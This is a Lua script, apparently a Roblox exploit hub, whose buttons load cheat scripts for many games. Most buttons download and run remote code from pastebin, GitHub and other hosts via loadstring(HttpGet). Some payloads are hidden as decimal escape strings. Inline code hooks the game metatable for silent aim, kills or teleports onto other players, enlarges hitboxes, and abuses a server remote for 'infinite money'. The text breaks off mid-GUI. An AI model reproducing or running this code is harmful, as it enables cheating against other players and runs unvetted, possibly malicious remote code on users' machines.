local Section = Tab:NewSection("Prop Hunt")

Section:NewButton("Prop Hunt 1", "idk this game too", function()
   loadstring(game:HttpGet(('https://pastebin.com/raw/tzTXmYf2'),true))()
end)




local Section = Tab:NewSection("KAT")

Section:NewButton("KAT Kill ALL", "Well That is cheating", function()
loadstring("\108\111\99\97\108\32\76\80\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\10\119\104\105\108\101\32\119\97\105\116\40\48\46\49\41\32\100\111\10\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\58\71\101\116\80\108\97\121\101\114\115\40\41\41\32\100\111\10\105\102\32\118\32\97\110\100\32\118\46\67\104\97\114\97\99\116\101\114\32\97\110\100\32\118\32\126\61\32\76\80\32\97\110\100\32\118\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\72\101\97\100\34\41\32\116\104\101\110\10\108\111\99\97\108\32\104\114\112\32\61\32\118\46\67\104\97\114\97\99\116\101\114\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\72\101\97\100\34\41\32\10\104\114\112\58\66\114\101\97\107\74\111\105\110\116\115\40\41\10\104\114\112\46\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\10\104\114\112\46\66\114\105\99\107\67\111\108\111\114\32\61\32\118\46\84\101\97\109\67\111\108\111\114\10\104\114\112\46\65\110\99\104\111\114\101\100\32\61\32\116\114\117\101\10\104\114\112\46\67\97\110\67\111\108\108\105\100\101\32\61\32\102\97\108\115\101\10\112\99\97\108\108\40\102\117\110\99\116\105\111\110\40\41\10\104\114\112\46\67\70\114\97\109\101\32\61\32\76\80\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\42\32\67\70\114\97\109\101\46\110\101\119\40\49\44\48\44\45\51\46\53\41\10\101\110\100\41\10\101\110\100\10\101\110\100\10\101\110\100\10")()
end)


Section:NewButton("KAT Silent AIm", "ButtonInfo", function()
   local Camera = game:GetService("Workspace").CurrentCamera
local Players = game:GetService("Players")
local LocalPlayer = game:GetService("Players").LocalPlayer

local function GetClosestPlayer()
   local ClosestPlayer = nil
   local FarthestDistance = math.huge

   for i, v in pairs(Players.GetPlayers(Players)) do
       if v ~= LocalPlayer and v.Character and v.Character.FindFirstChild(v.Character, "HumanoidRootPart") then
           local DistanceFromPlayer = (LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude

           if DistanceFromPlayer < FarthestDistance then
               FarthestDistance = DistanceFromPlayer
               ClosestPlayer = v
           end
       end
   end

   if ClosestPlayer then
       return ClosestPlayer
   end
end

local GameMetaTable = getrawmetatable(game)
local OldGameMetaTableNamecall = GameMetaTable.__namecall
setreadonly(GameMetaTable, false)

GameMetaTable.__namecall = newcclosure(function(object, ...)
   local NamecallMethod = getnamecallmethod()
   local Arguments = {...}

   if tostring(NamecallMethod) == "FindPartOnRayWithIgnoreList" then
       local ClosestPlayer = GetClosestPlayer()
       
       if ClosestPlayer and ClosestPlayer.Character then
           Arguments[1] = Ray.new(Camera.CFrame.Position, (ClosestPlayer.Character.Head.Position - Camera.CFrame.Position).Unit * (Camera.CFrame.Position - ClosestPlayer.Character.Head.Position).Magnitude)
       end
   end

   return OldGameMetaTableNamecall(object, unpack(Arguments))
end)

setreadonly(GameMetaTable, true)
end)


Section:NewButton("KAT OP", "Has speed,kill all,and more", function()
   game.StarterGui:SetCore("SendNotification", {
    Title = "Enjoy";
    Text = "Made by JN HH Gaming"; -- what the text says (ofc)
    Duration = 60;
})
wait(1)
game.StarterGui:SetCore("SendNotification", {
    Title = "Subscribe To Him";
    Text = "Now!"; -- what the text says (ofc)
    Duration = 60;
})

-- Gui to Lua
-- Version: 3.
-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(39, 15, 245)
Main.Position = UDim2.new(0.363293529, 0, 0.28638497, 0)
Main.Size = UDim2.new(0, 300, 0, 154)
Main.Style = Enum.FrameStyle.ChatRed

TextLabel.Parent = Main
TextLabel.BackgroundColor3 = Color3.fromRGB(17, 1, 1)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(-0.025588274, 0, -0.0890700519, 0)
TextLabel.Size = UDim2.new(0, 250, 0, 30)
TextLabel.Font = Enum.Font.SciFi
TextLabel.Text = "JN HH Gaming Speed"
TextLabel.TextColor3 = Color3.fromRGB(245, 16, 16)
TextLabel.TextScaled = true
TextLabel.TextSize = 12.000
TextLabel.TextWrapped = true

TextButton.Parent = Main
TextButton.BackgroundColor3 = Color3.fromRGB(17, 1, 1)
TextButton.Position = UDim2.new(0.136470661, 0, 0.458670378, 0)
TextButton.Size = UDim2.new(0, 200, 0, 58)
TextButton.Style = Enum.ButtonStyle.RobloxRoundDefaultButton
TextButton.Font = Enum.Font.SciFi
TextButton.Text = "Click To Activate"
TextButton.TextColor3 = Color3.fromRGB(21, 235, 78)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
TextButton.MouseButton1Down:connect(function()
 while true do wait() game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 60 end
Walkspeed()
end)
-- Scripts:

local function LASGYB_fake_script() -- ScreenGui.Script 
	local script = Instance.new('Script', ScreenGui)

	frame = script.Parent.Main -- Take out {}s, and put name of frame
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
end
coroutine.wrap(LASGYB_fake_script)()

local InfiniteJumpEnabled = true
game:GetService("UserInputService").JumpRequest:connect(function()
	if InfiniteJumpEnabled then
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end
end)

shared.enabled = w
game:GetService("RunService").heartbeat:connect(function()
if not shared.enabled then return end
game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.GroundHit:FireServer(workspace.Map.Blocks,1645488277.345853)
wait()
end)

-- FE Invisible

Local = game:GetService('Players').LocalPlayer
Char  = Local.Character
touched,tpdback = false, false
Local.CharacterAdded:connect(function(char)
    if script.Disabled ~= true then
        wait(.25)
        loc = Char.HumanoidRootPart.Position
        Char:MoveTo(box.Position + Vector3.new(0,.5,0))
    end
end)
game:GetService('UserInputService').InputBegan:connect(function(key)
    if key.KeyCode == Enum.KeyCode.Equals then
        if script.Disabled ~= true then
            script.Disabled = true
            print'you may re-execute'
        end
    end
end)
box = Instance.new('Part',workspace)
box.Anchored = true
box.CanCollide = true
box.Size = Vector3.new(10,1,10)
box.Position = Vector3.new(0,10000,0)
box.Touched:connect(function(part)
    if (part.Parent.Name == Local.Name) then
        if touched == false then
            touched = true
            function apply()
                if script.Disabled ~= true then
                    no = Char.HumanoidRootPart:Clone()
                    wait(.25)
                    Char.HumanoidRootPart:Destroy()
                    no.Parent = Char
                    Char:MoveTo(loc)
                    touched = false
                end end
            if Char then
                apply()
            end
        end
    end
end)
repeat wait() until Char
loc = Char.HumanoidRootPart.Position
Char:MoveTo(box.Position + Vector3.new(0,.5,0))

local Camera = game:GetService("Workspace").CurrentCamera
local Players = game:GetService("Players")
local LocalPlayer = game:GetService("Players").LocalPlayer

local function GetClosestPlayer()
   local ClosestPlayer = nil
   local FarthestDistance = math.huge

   for i, v in pairs(Players.GetPlayers(Players)) do
       if v ~= LocalPlayer and v.Character and v.Character.FindFirstChild(v.Character, "HumanoidRootPart") then
           local DistanceFromPlayer = (LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude

           if DistanceFromPlayer < FarthestDistance then
               FarthestDistance = DistanceFromPlayer
               ClosestPlayer = v
           end
       end
   end

   if ClosestPlayer then
       return ClosestPlayer
   end
end

local Camera = game:GetService("Workspace").CurrentCamera
local Players = game:GetService("Players")
local LocalPlayer = game:GetService("Players").LocalPlayer

local function GetClosestPlayer()
   local ClosestPlayer = nil
   local FarthestDistance = math.huge

   for i, v in pairs(Players.GetPlayers(Players)) do
       if v ~= LocalPlayer and v.Character and v.Character.FindFirstChild(v.Character, "HumanoidRootPart") then
           local DistanceFromPlayer = (LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude

           if DistanceFromPlayer < FarthestDistance then
               FarthestDistance = DistanceFromPlayer
               ClosestPlayer = v
           end
       end
   end

   if ClosestPlayer then
       return ClosestPlayer
   end
end

local GameMetaTable = getrawmetatable(game)
local OldGameMetaTableNamecall = GameMetaTable.__namecall
setreadonly(GameMetaTable, false)

GameMetaTable.__namecall = newcclosure(function(object, ...)
   local NamecallMethod = getnamecallmethod()
   local Arguments = {...}

   if tostring(NamecallMethod) == "FindPartOnRayWithIgnoreList" then
       local ClosestPlayer = GetClosestPlayer()
       
       if ClosestPlayer and ClosestPlayer.Character then
           Arguments[1] = Ray.new(Camera.CFrame.Position, (ClosestPlayer.Character.Head.Position - Camera.CFrame.Position).Unit * (Camera.CFrame.Position - ClosestPlayer.Character.Head.Position).Magnitude)
       end
   end

   return OldGameMetaTableNamecall(object, unpack(Arguments))
end)

setreadonly(GameMetaTable, true)
end)




local Section = Tab:NewSection("Build a Boat")

Section:NewButton("Build a Boat 1", "havent played", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/Script"))()
end)

Section:NewButton("Build a Boat 2", "havent play", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/StenDirt/Trash-Game/main/Script.lua"))()
end)

Section:NewButton("Build a Boat 3", "Dino-Hub", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/SandaFrosty/Dino-Script/main/Build-Boat-For-Treasure"))()
end)

Section:NewButton("Build a Boat 4", "idk", function()
_G.autofarm = true loadstring(game:HttpGet('https://gist.githubusercontent.com/cod2rx/d2a7e436d3af135d787529141e6485cc/raw/5bb4df0a94b0a3cf06f0c87a25cb6859e56d23e3/BABFT%2520Autofarm.lua'))()
end)

Section:NewButton("Build a Boat 5", "Bored", function()
_G.Color = Color3.fromRGB(255, 255, 255)
loadstring(game:HttpGet"https://rawscripts.net/raw/SAZA-HUB_496")()
end)



local Section = Tab:NewSection("Goal Simulator")

Section:NewButton("Goal Simulator 1", "Play soccer", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/Scripts/main/GoalKickSimulator"))()
end)




local Section = Tab:NewSection("Anime Dimensions")

Section:NewButton("Anime Dimensions 1", "Different anime lol", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/TheWitch-BirdHub/BirdHubv0.1/main/load"))()
end)

Section:NewButton("Anime Dimension 2", "Anime wow im a fan lol", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/ghost-home/public/main/AnimeGhost.lua', true))()
end)

local Section = Tab:NewSection("No Scope Sniper")

Section:NewButton("Op Silent Aim", "Well its not silent lol", function()
      getgenv().Settings = {

   Fov = 150,

   Hitbox = "Head",

   FovCircle = true,

}



loadstring(game:HttpGet("https://raw.githubusercontent.com/WetCheezit/Releases/main/No-Scope-Arcade/Silent%20aim.lua"))()
end)


local Section = Tab:NewSection("MeepCity")

Section:NewButton("MeepCity GUI 1", "Kinda Old", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/synolope/meepcracked/main/script.lua"))()
end)



local Section = Tab:NewSection("Muscle Legend")

Section:NewButton("Muscle Lengend GUI 1", "Op lol", function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/jynzl/main/main/Musclas%20Legenos.lua'))()
end)

Section:NewButton("Muscle legend Gui 2", "Dope lol", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/harisiskandar178/Roblox-Script/main/Muscle%20Legend"))()
end)


local Section = Tab:NewSection("Ninja Legend")

Section:NewButton("Ninja Legend GUI 1", "its a month old", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/1"))()
end)

Section:NewButton("Ninja Legend GUI 2", "its OP but its old", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/StormSKz12/StirkeHub1/main/Gameincluded"))()
end)



local Section = Tab:NewSection("Fighting Simulator")

Section:NewButton("Fighting Simulator GUI 1", "ButtonInfo", function()
   loadstring(game:HttpGet("https://rawscripts.net/raw/loader_1038"))()
end)




local Section = Tab:NewSection("Ultra Power Tycoon")

Section:NewButton("Ultra Power Tycoon", "Yea super power", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/anisnouacer1/My-Roblox-Scripts/main/Ultra%20Power%20Tycoon.lua"))()
end)




local Section = Tab:NewSection("Animal Simulator")

Section:NewButton("Animal Simulator GUI 1", "No info idk", function()
       loadstring(game:HttpGet('https://raw.githubusercontent.com/LeftOnReadInvalid/RobloxStuff/main/Animal%20Simulator%20GUI', true))()
end)




local Section = Tab:NewSection("Slap Battle")

Section:NewButton("Slap Battle 1", "Its some months old", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/dizyhvh/slap_battles_gui/main/0.lua"))()
end)

Section:NewButton("Slap Battle 2", "New lol", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/dizyhvh/slap_battles_gui/main/0.lua"))()
end)


local Section = Tab:NewSection("AnimeFighter")

Section:NewButton("AnimeFighterSimulator 1", "Op Yea", function()
game.StarterGui:SetCore("SendNotification", {
    Title = "Subscribe To xMiles_Games";
    Text = "Subscribe For More Scripts"; -- what the text says (ofc)
    Duration = 60;
})

loadstring(game:HttpGet(('https://raw.githubusercontent.com/XTheMasterX/Scripts/Main/AnimeFightingSim'),true))()
end)


Section:NewButton("AnimeFighter 2", "Op Yea", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Shisobad/new/main/script.lua"))()
end)

Section:NewButton("AnimeFighterSimulator 3", "Op Yea", function()
loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/KiJinGaming/FreeScript/main/KJHub.lua"))(); 
end)






local Section = Tab:NewSection("Shindo Life")


Section:NewButton("Shindo Life Gui 1", "Anime Always", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/PremierHub/Data/main/code.lua"))()
end)


Section:NewButton("Shindo Life Gui 2", "Anime Always", function()
local library = loadstring(game:HttpGet("https://pastebin.com/raw/GAGA5H8t"))();

local Gamer = library:CreateSection("Shindo Life");
Gamer:Button("~ Press Right Shift To Hide GUI ~");
function LoadMe(link)
    loadstring(game:HttpGet(link))()
end
Gamer:Button("Infinite Spins", function()
    LoadMe('https://raw.githubusercontent.com/FurkyYT/stuff/main/infspin')
end)
Gamer:Button("Best GUI", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/i53Y3rew",true))()
end)
Gamer:Button("NEW OP GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/6Wumpus6/SpyHub/main/ShindoLife", true))()
end)
Gamer:Button("GUI 2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/reavscripts/sl2_autofarm/main/main.lua", true))()
end)
Gamer:Button("GUI 3", function()
    LoadMe('http://assasine.com/Scripts/Shinobi_Life_2_Autofarm.lua')
end)
Gamer:Button("GUI 4", function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/Kc7XZKbC'),true))()
end)
Gamer:Button("Auto Quest", function()
    LoadMe('https://pastebin.com/raw/d993kP6G')
end)
Gamer:Button('Inf Chakra',function()
    _G.InfChakra = true
    loadstring(game:HttpGet('https://pastebin.com/raw/P0BqvPg7'))()    
end)

library:Ready();
end)

Section:NewButton("Shindo Life Gui 3", "New 3 days old lol", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SxnwDev/Premier/main/Free-Premier.lua", true))()
end)



local Section= Tab:NewSection("Clicker Simulator")

Section:NewButton("Clicker Simulator 1", "Click Fast", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Kederal/script.gg/main/loader.lua"))()
end)

Section:NewButton("Clicker Simulator 2", "Clicker Bitch", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ExtremeAntonis/KeySystemUI/main/KeySystemUI-Obfuscated.lua"))()
end)



local Section = Tab:NewSection("Pls Donate")

Section:NewButton("Pls Donate Gui 1", "Boi you poor.. oh im sorry", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/NocturneMoDz/PLEASE-DONATE-NEW-GUI-/main/METAB"))();
end)

Section:NewButton("Pls Donate Gui 2", "Lol Poor but new gui", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/NocturneMoDz/PLEASE-DONATE-BOOTH-/main/METAB"))()
end)


local Section = Tab:NewSection("One Piece")

Section:NewButton("One piece 1", "Luffy,Zoro,Sanji,Usopp", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/32"))()
end)

Section:NewButton("One Piece 2", "Pirate king lol", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/Urbanstorms/Cool-things/main/A%200ne%20Piece%20Game.lua'),true))()
end)





local Section = Tab:NewSection("Raise A Floppa")

Section:NewButton("Raise a Floppa Gui 1", "Feed cat", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/SunkenMuch/Soggyware/main/Main',true))()
end)

Section:NewButton("Raise a Floppa Gui 2", "Belgua lol", function()
   local Library =
   loadstring(game:HttpGet("https://raw.githubusercontent.com/preztel/AzureLibrary/master/uilib.lua", true))()

local AutoTab = Library:CreateTab("raise a floppa", "things", true)

AutoTab:CreateToggle(
   "Auto Click Floppa",
   function(kd55fs)
       _G.toggle5fs21 = kd55fs or false
       game:GetService("RunService").Stepped:connect(
           function()
               if _G.toggle5fs21 then
                   pcall(
                       function()
                           fireclickdetector(game:GetService("Workspace").Floppa.ClickDetector)
                           fireclickdetector(game:GetService("Workspace")["Baby Floppa"].ClickDetector)
                       end
                   )
               end
           end
       )
   end
)
local Money = {"Money", "Gold Bar", "Money Bag"}
AutoTab:CreateToggle(
   "Auto Collect Money",
   function(sse)
       _G.s1 = sse or false
       while _G.s1 and wait(.2) do
           for i, v in pairs(game:GetService("Workspace").Money:GetChildren()) do
               if v:IsA("TouchTransmitter") then
                   firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 0)
                   wait()
                   firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 1) 
               end
           end
       end
   end
)
AutoTab:CreateToggle(
   "Auto Collect Fertilizer",
   function(ssse)
       _G.s1s = ssse or false
       while _G.s1s and wait(.1) do
           for i, v in pairs(game:GetService("Workspace").Fertilizer:GetDescendants()) do
               if v:IsA("TouchTransmitter") then
                   firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 0) 
                   wait()
                   firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 1) 
               end
           end
       end
   end
)
AutoTab:CreateToggle(
   "Auto Press E",
   function(ssse1)
       _G.s1s1 = ssse1 or false
       while _G.s1s1 and wait(.1) do
           local vim = game:service("VirtualInputManager")
           vim:SendKeyEvent(true, "E", false, game)
       end
   end
)
AutoTab:CreateButton(
   "Collect Almond Milk",
   function()
       for i, v in pairs(game:GetService("Workspace").Backrooms:GetChildren()) do
           game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v["Almond Water Pickup"].CFrame
       end
       wait(1)
       local vim = game:service("VirtualInputManager")
       vim:SendKeyEvent(true, "E", false, game)
   end
)
AutoTab:CreateButton(
   "Made By: Bebo Mods",
   function()
   end
)
end)


local Section = Tab:NewSection("My Kingdom")

Section:NewButton("My Kingdom Infinite Money", "No your rich", function()
--// Created by Ezpi#0474 \\--

--// Settings \\--
local Amount = 999999999999

--// Services \\--
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

--// Variables \\--
local Player = Players.LocalPlayer
local Upgrade = ReplicatedStorage:WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("ProximityPrompts"):WaitForChild("RE"):WaitForChild("ConfirmUpgrade")
local Map = Workspace:WaitForChild("PlayerMaps"):WaitForChild("Active"):WaitForChild(Player.Name .. "_map")

--// Inf. Cash \\--
local Building = Map:FindFirstChildWhichIsA("ProximityPrompt", true)
if Building then
    Upgrade:FireServer({
        Parent = Building.Parent,
        Name = Player.Name .. ";3;" .. Building:FindFirstAncestorOfClass("Model").Name .. ";" .. tostring(-Amount)
    })
end
end)




local Section = Tab:NewSection("Shrek in Backroom")

Section:NewButton("Shrek in Backroom Gui 1", "Shrekkkk", function()
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\110\106\120\66\100\102\67\76\10"))()
end)



local Section = Tab:NewSection("Starving Artist")

Section:NewButton("Starving Artist Copy", "wow u bad at art lol", function()
Settings = {
    Timer = true -- false if You Dont Wanna Timer --
}

loadstring(game:HttpGet(('https://raw.githubusercontent.com/anisnouacer1/My-Roblox-Scripts/main/Starving%20Artists.lua')))()
end)


local Section = Tab:NewSection("Be A parkour Ninja")

Section:NewButton("Be a Parkour Gui 1", "op", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Min1273/n-to/main/README.md"))()
end)

Section:NewButton("Be a Parkour HitBox", "Bro Mobile Hitbox lol", function()
local InfiniteJumpEnabled = true
game:GetService("UserInputService").JumpRequest:connect(function()
	if InfiniteJumpEnabled then
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end
end)

local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    wait(1)
    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
 
game.StarterGui:SetCore("SendNotification", {
    Title = "Subscribe To JN HH Gaming";
    Text = "Made by JN HH Gaming"; -- what the text says (ofc)
    Duration = 60;
})
wait(1)
game.StarterGui:SetCore("SendNotification", {
    Title = "Have Fun Killing";
    Text = "Enjoy"; -- what the text says (ofc)
    Duration = 60;
})
_G.HeadSize = 20
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)
end)

Section:NewButton("Be a parkour Auto Kill", "Teleport Oh", function()
spawn(function()
 while task.wait() do
pcall(function()
  game:GetService'VirtualUser':Button1Down(Vector2.new(0.9,0.9))
       game:GetService'VirtualUser':Button1Up(Vector2.new(0.9,0.9))

for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
       if v.name == "Katana" then -- change name of tool here
           v.Parent = game.Players.LocalPlayer.Character
end end end) end end)

spawn(function()
 while task.wait(0.1) do
pcall(function()

local Player = game.Players.LocalPlayer
local cpos = Player.Character.HumanoidRootPart.CFrame
           for i,v in pairs(game.Players:GetPlayers()) do
       if v.Name ~= Player.Name then
           local i = 10
           repeat
           wait(0.5)
           i = i-1
local CFrameEnd = CFrame.new(v.Character.HumanoidRootPart.position)
local Time = 0.3
local tween =  game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Time), {CFrame = CFrameEnd})
tween:Play()
tween.Completed:Wait(E)

until i == 0 or game.Players[v.Name].Character.Humanoid.Health == 0
end end end) end end)
spawn(function()
 while task.wait(3) do
pcall(function()
if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
game:GetService("ReplicatedStorage").RemoteTriggers.SpawnIn:FireServer()
end end) end end)
end)



local Section = Tab:NewSection("Monster Ghoul")

Section:NewButton("Monster Ghoul Gui 1", "Tokoy Ghoul i think", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/itsyouranya/free/main/monsterghoul.lua"))()
end)

Section:NewButton("Monster Ghoul Gui 2(New)", " ", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/itsyouranya/free/main/monsterghoul.lua", true))()
end)


local Section = Tab:NewSection("Mining Simulator 2")

Section:NewButton("MiningSim2 AutoFarm", "New lol", function()
getgenv().Chests = {
'Legendary';
'Epic';
}
loadstring(game:HttpGet'https://github.com/RunDTM/miningsim2/raw/main/serverhop.lua')()
end)

Section:NewButton("MiningSim2 Gui 1", "new", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/MaGiXxScripter/Cum-Hub/main/loader'))()
end)

Section:NewButton("MiningSim2 Gui 2(New)", "Kinda old lol", function()
_G.key = "aMoGuS" 
loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/TheALLHACKLoader/main/NukeLoader"))()
end)

Section:NewButton("MiningSim2 Gui 3(New)", "New", function()
loadstring(game:HttpGet'https://raw.githubusercontent.com/RunDTM/miningsim2/main/rewrite.lua')()
end)

Section:NewButton("MiningSim2 Gui 4(New)", "idk what to say", function()
loadstring(game:HttpGet'https://github.com/RunDTM/miningsim2/raw/main/script.lua')()
end)

local Section = Tab:NewSection("Zombie Attack")

Section:NewButton("Zombie Attack 1", "Zombiiee lol", function()
    loadstring(game:HttpGet('https://ghost-storage.7m.pl/scripts/ghosthublauncher.lua'))()
end)

Section:NewButton("Zombie Attack 2(New)", "Kinda old but Op", function()
-- Made by TeamPoison --
-- V3rmillion: T3aMp0isoN --
-- Discord: Brother Omar#9562 --

local ZombieAttackGUI = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local Frame = Instance.new("Frame")
local TextLabel_3 = Instance.new("TextLabel")
local ConsoleFrame = Instance.new("Frame")
local Console = Instance.new("TextLabel")
local Frame_2 = Instance.new("Frame")
local TextLabel_4 = Instance.new("TextLabel")
local Frame_3 = Instance.new("Frame")
local TextLabel_5 = Instance.new("TextLabel")
local Frame_4 = Instance.new("Frame")
local TextLabel_6 = Instance.new("TextLabel")
local KillPlatform = Instance.new("TextButton")
local StealKills = Instance.new("TextButton")
local AutoFarm = Instance.new("TextButton")
local NoRecoil = Instance.new("TextButton")
local Guns = Instance.new("TextButton")
local Knifes = Instance.new("TextButton")
local Fly = Instance.new("TextButton")
local Noclip = Instance.new("TextButton")
local Gravity = Instance.new("TextButton")
local Speed = Instance.new("TextButton")
local Jump = Instance.new("TextButton")
local Btools = Instance.new("TextButton")
 
ZombieAttackGUI.Name = "Zombie Attack GUI"
ZombieAttackGUI.Parent = game.CoreGui
ZombieAttackGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = ZombieAttackGUI
Main.BackgroundColor3 = Color3.new(0.247059, 0, 0.372549)
Main.BackgroundTransparency = 0.15000000596046
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.794708014, 0, 0, 0)
Main.Size = UDim2.new(0.191605836, 0, 1, 0)

TextLabel.Parent = Main
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0768115819, 0, 0.068296887, 0)
TextLabel.Size = UDim2.new(0.842857122, 0, 0.0322580636, 0)
TextLabel.Font = Enum.Font.SourceSansSemibold
TextLabel.Text = "Made by T3aMp0isoN on v3rm"
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextScaled = true
TextLabel.TextSize = 14
TextLabel.TextWrapped = true

TextLabel_2.Parent = Main
TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_2.BackgroundTransparency = 1
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.0434782468, 0, 0.0118953418, 0)
TextLabel_2.Size = UDim2.new(0.90476191, 0, 0.0569259971, 0)
TextLabel_2.Font = Enum.Font.SourceSansSemibold
TextLabel_2.Text = "Zombie Attack Menu"
TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14
TextLabel_2.TextWrapped = true

Frame.Parent = Main
Frame.BackgroundColor3 = Color3.new(0.0156863, 0.0156863, 0.0156863)
Frame.BackgroundTransparency = 0.5
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0, 0, 0.111954458, 0)
Frame.Size = UDim2.new(1, 0, 0.0417457297, 0)

TextLabel_3.Parent = Frame
TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_3.BackgroundTransparency = 1
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.0434782468, 0, 0.181818187, 0)
TextLabel_3.Size = UDim2.new(0.90476191, 0, 0.590909064, 0)
TextLabel_3.Font = Enum.Font.SourceSansSemibold
TextLabel_3.Text = "Console"
TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14
TextLabel_3.TextWrapped = true
TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left

ConsoleFrame.Name = "ConsoleFrame"
ConsoleFrame.Parent = Main
ConsoleFrame.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
